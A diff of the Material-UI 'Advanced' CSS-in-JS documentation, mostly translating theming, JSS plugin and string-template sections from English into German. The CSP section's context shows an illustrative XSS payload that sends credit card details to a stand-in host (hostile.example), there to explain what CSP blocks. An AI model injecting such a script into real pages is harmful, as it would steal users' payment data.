@@ -1,16 +1,16 @@
-# Advanced
+# Erweitert
 
-<p class="description">Advanced Usage.</p>
+<p class="description">Fortgeschrittene Verwendung.</p>
 
 ## Theming
 
-Add a `ThemeProvider` to the top level of your app to access the theme down the React's component tree. Then, you can access the theme object in the style functions.
+Fügen Sie auf der oberste Ebene Ihrer App einen ` ThemeProvider` hinzu, um auf das Theme im Komponentenbaum von React zuzugreifen. Anschließend können Sie in den Stilfunktionen auf das Designobjekt zugreifen.
 
 {{"demo": "pages/css-in-js/advanced/Theming.js"}}
 
-## Accessing the theme in a component
+## Zugriff auf das Theme in einer Komponente
 
-You might need to access the theme variables inside your React components.
+Möglicherweise müssen Sie auf die Themevariablen in Ihren React-Komponenten zugreifen.
 
 ### `useTheme` hook
 
@@ -20,9 +20,9 @@ You might need to access the theme variables inside your React components.
 
 {{"demo": "pages/css-in-js/advanced/WithTheme.js"}}
 
-## Theme nesting
+## Verschachtelung des Themes
 
-You can nest multiple theme providers. This can be really useful when dealing with different area of your application that have distinct appearance from each other.
+Sie können mehrere Theme Provider verschachteln. Dies kann sehr nützlich sein, wenn Sie sich mit unterschiedlichen Bereichen Ihrer Anwendung befassen, die sich voneinander unterscheiden.
 
 ```jsx
 <ThemeProvider theme={outerTheme}>
@@ -35,7 +35,7 @@ You can nest multiple theme providers. This can be really useful when dealing wi
 
 {{"demo": "pages/css-in-js/advanced/ThemeNesting.js"}}
 
-The inner theme will **override** the outer theme. You can extend the outer theme by providing a function:
+Das innere Theme ** überschreibt** das äußere Theme. Sie können das äußere Theme erweitern, indem Sie eine Funktion bereitstellen:
 
 ```jsx
 <ThemeProvider theme={…} >
@@ -46,9 +46,9 @@ The inner theme will **override** the outer theme. You can extend the outer them
 </ThemeProvider>
 ```
 
-## JSS plugins
+## JSS-Plugins
 
-JSS uses the concept of plugins to extend its core, allowing people to cherry-pick the features they need. You pay the performance overhead for only what's you are using. All the plugins aren't available by default. We have added the following list:
+JSS nutzt das Konzept von Plugins, um seine Kernfunktionalitäten zu erweitern, sodass die Benutzer die gewünschten Funktionen auswählen können. Sie zahlen den Leistungsaufwand nur für das, was Sie verwenden. Alle Plugins sind standardmäßig nicht verfügbar. Wir haben die folgende Liste hinzugefügt:
 
 - [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)
 - [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)
@@ -58,7 +58,7 @@ JSS uses the concept of plugins to extend its core, allowing people to cherry-pi
 - [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)
 - [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)
 
-It's a subset of [jss-preset-default](https://cssinjs.org/jss-preset-default/). Of course, you are free to add a new plugin. Here is an example with the [jss-rtl](https://github.com/alitaheri/jss-rtl) plugin.
+Es ist eine Teilmenge von [ Jss-Preset-Default ](https://cssinjs.org/jss-preset-default/). Selbstverständlich können Sie ein neues Plugin hinzufügen. Hier ist ein Beispiel mit dem [ jss-rtl ](https://github.com/alitaheri/jss-rtl) Plugin.
 
 ```jsx
 import { create } from 'jss';
@@ -80,9 +80,9 @@ function App() {
 export default App;
 ```
 
-## String templates
+## String-Vorlagen
 
-If you prefer using the CSS syntax, you can use the [jss-plugin-template](https://cssinjs.org/jss-plugin-template) plugin.
+Wenn Sie die CSS-Syntax bevorzugen, können Sie das [Jss-Plugin-Vorlage ](https://cssinjs.org/jss-plugin-template) Plugin verwenden.
 
 ```jsx
 const useStyles = makeStyles({
@@ -256,10 +256,10 @@ We provide an option to make the class names **deterministic** with the [`danger
 - development: `.AppBar-root`
 - production: `.AppBar-root`
 
-⚠️ **Be cautious when using `dangerouslyUseGlobalCSS`.** We provide this option as an escape hatch for prototyping. Relying on it for code running in production has the following implications:
+⚠️ **Be cautious when using `dangerouslyUseGlobalCSS`.** Relying on it for code running in production has the following implications:
 
-- Global CSS is inherently fragile. People use strict methodologies like [BEM](http://getbem.com/introduction/) to workaround the issue.
-- It's harder to keep track of `classes` API changes.
+- It's harder to keep track of `classes` API changes between major releases.
+- Global CSS is inherently fragile.
 
 ⚠️ When using `dangerouslyUseGlobalCSS` standalone (without Material-UI), you should name your style sheets using the `options` parameter:
 
@@ -283,7 +283,7 @@ Basically, CSP mitigates cross-site scripting (XSS) attacks by requiring develop
     <script>
       sendCreditCardDetails('https://hostile.example');
     </script>
-
+    
 
 This vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.
 
